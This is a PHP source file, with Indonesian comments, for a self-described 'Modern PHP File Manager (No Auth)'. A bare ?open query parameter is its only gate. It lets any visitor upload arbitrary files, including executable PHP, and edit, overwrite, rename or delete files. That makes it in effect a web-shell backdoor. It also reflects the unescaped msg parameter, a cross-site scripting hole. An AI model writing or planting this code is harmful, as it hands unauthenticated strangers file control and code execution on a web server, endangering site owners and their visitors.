<?php
/****************************
 * Modern PHP File Manager (No Auth)
 ****************************/

// Akses hanya dengan query ?open
if (!isset($_GET['open'])) {
    die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
}

$ROOT_DIR = __DIR__; // direktori dasar

function safe_path($root, $path) {
    $real = realpath($root . '/' . $path);
    if ($real === false || strncmp($real, realpath($root), strlen(realpath($root))) !== 0) {
        return false;
    }
    return $real;
}

$cwd = isset($_GET['p']) ? $_GET['p'] : '';
$currentDir = safe_path($ROOT_DIR, $cwd);
if ($currentDir === false) $currentDir = $ROOT_DIR;

$msg = "";

// ==== Actions ====
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'upload' && isset($_FILES['file'])) {
        $fname = basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $currentDir.'/'.$fname);
        $msg = "File berhasil di-upload";
    }

    if ($action === 'rename') {
        $old = safe_path($currentDir, $_POST['old']);
        $new = safe_path($currentDir, $_POST['new']);
        if ($old && $new) rename($old, $new);
        $msg = "Nama berhasil diubah";
    }

    if ($action === 'delete') {
        $target = safe_path($currentDir, $_POST['target']);
        if ($target && is_file($target)) unlink($target);
        elseif ($target && is_dir($target)) rmdir($target);
        $msg = "Berhasil dihapus";
    }

    if ($action === 'save') {
        $f = safe_path($currentDir, $_POST['file']);
        if ($f && is_file($f)) file_put_contents($f, $_POST['content']);
        $msg = "Perubahan disimpan";
    }

    if ($action === 'create_folder') {
        $fname = trim($_POST['folder_name']);
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
            $msg = "Nama folder tidak valid (hanya alfanumerik, _, -, .)";
        } elseif (file_exists($currentDir . '/' . $fname)) {
            $msg = "Folder sudah ada";
        } else {
            mkdir($currentDir . '/' . $fname);
            $msg = "Folder berhasil dibuat";
        }
    }

    if ($action === 'create_file') {
        $fname = trim($_POST['file_name']);
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
            $msg = "Nama file tidak valid (hanya alfanumerik, _, -, .)";
        } elseif (file_exists($currentDir . '/' . $fname)) {
            $msg = "File sudah ada";
        } else {
            file_put_contents($currentDir . '/' . $fname, '');
            $msg = "File berhasil dibuat";
        }
    }

    header("Location: ?open&p=".urlencode($cwd)."&msg=".urlencode($msg));
    exit;
}

$editFile = null;
if (isset($_GET['edit'])) {
    $editPath = safe_path($currentDir, $_GET['edit']);
    if ($editPath && is_file($editPath)) $editFile = $editPath;
}

$items = scandir($currentDir);
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Modern File Manager</title>
<link rel="stylesheet"
 href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
<style>
body{background:#f6f7fb}
.card-modern{border-radius:18px;border:1px solid #e8e9ef}
.badge-folder{background:#e9f2ff;color:#2c67ff}
.badge-file{background:#f3f3f6;color:#555}
.table td,.table th{vertical-align:middle}
input[type=text]{max-width:140px}
</style>
</head>
<body>
<div class="container py-4">

    <div class="mb-3">
        <h3 class="fw-semibold mb-1">File Manager</h3>
        <div class="text-secondary">Modern • Minimal • Clean UI</div>
    </div>

    <?php if (isset($_GET['msg'])): ?>
        <div class="alert alert-success shadow-sm card-modern mb-3"><?=$_GET['msg']?></div>
    <?php endif; ?>

    <div class="card card-modern shadow-sm mb-4">
        <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
            <div>
                <strong class="text-secondary">Path</strong> :
                /
                <?php
                $parts = explode('/', trim($cwd,'/'));
                $pathBuild = "";
                foreach ($parts as $part) {
                    if ($part==="") continue;
                    $pathBuild .= "/$part";
                    echo ' <a class="link-primary" href="?open&p='.urlencode(trim($pathBuild,'/')).'">'.$part.'</a> /';
                }
                ?>
            </div>

            <div class="d-flex gap-2 flex-wrap">
                <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                    <input type="hidden" name="action" value="upload">
                    <input type="file" name="file" class="form-control form-control-sm" required>
                    <button class="btn btn-primary btn-sm px-3">Upload</button>
                </form>

                <form method="post" class="d-flex gap-2">
                    <input type="hidden" name="action" value="create_folder">
                    <input type="text" name="folder_name" class="form-control form-control-sm" placeholder="Nama Folder" required>
                    <button class="btn btn-success btn-sm px-3">Buat Folder</button>
                </form>

                <form method="post" class="d-flex gap-2">
                    <input type="hidden" name="action" value="create_file">
                    <input type="text" name="file_name" class="form-control form-control-sm" placeholder="Nama File" required>
                    <button class="btn btn-info btn-sm px-3">Buat File</button>
                </form>
            </div>
        </div>
    </div>

    <?php if ($editFile): ?>
    <div class="card card-modern shadow-sm mb-4">
        <div class="card-header bg-white fw-semibold">
            Edit File — <?=basename($editFile)?>
        </div>
        <div class="card-body">
            <form method="post">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
                <textarea name="content" rows="12" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
                <div class="d-flex gap-2">
                    <button class="btn btn-primary px-3">Simpan</button>
                    <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary">Batal</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <div class="card card-modern shadow-sm">
        <div class="table-responsive">
        <table class="table mb-0">
            <thead class="table-light">
            <tr>
                <th>Nama</th>
                <th>Tipe</th>
                <th>Ukuran</th>
                <th class="text-end">Aksi</th>
            </tr>
            </thead>
            <tbody>
            <?php foreach ($items as $it):
                if ($it === '.') continue;
                if ($it === '..' && $currentDir === $ROOT_DIR) continue;
                $rel = trim(($cwd ? $cwd.'/' : '').$it,'/');
                $full = safe_path($currentDir, $it);
                if ($full === false) continue;
                $isDir = is_dir($full);
            ?>
            <tr>
                <td class="fw-medium">
                    <?php if ($isDir): ?>
                        <span class="badge badge-folder me-1">Folder</span>
                        <a href="?open&p=<?=urlencode($rel)?>" class="link-body-emphasis"><?=$it?></a>
                    <?php else: ?>
                        <span class="badge badge-file me-1">File</span>
                        <?=$it?>
                    <?php endif; ?>
                </td>
                <td><?=$isDir ? 'Folder' : 'File'?></td>
                <td><?=$isDir ? '—' : filesize($full).' bytes'?></td>
                <td class="text-end">
                    <?php if(!$isDir): ?>
                        <a class="btn btn-sm btn-outline-primary"
                           href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
                    <?php endif; ?>

                    <form method="post" class="d-inline"
                          onsubmit="return confirm('Hapus item ini?')">
                        <input type="hidden" name="action" value="delete">
                        <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
                        <button class="btn btn-sm btn-outline-danger">Delete</button>
                    </form>

                    <form method="post" class="d-inline">
                        <input type="hidden" name="action" value="rename">
                        <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
                        <input type="text" name="new" class="form-control form-control-sm d-inline"
                               placeholder="rename">
                        <button class="btn btn-sm btn-outline-secondary">OK</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
        </div>
    </div>

</div>
</body>
</html>
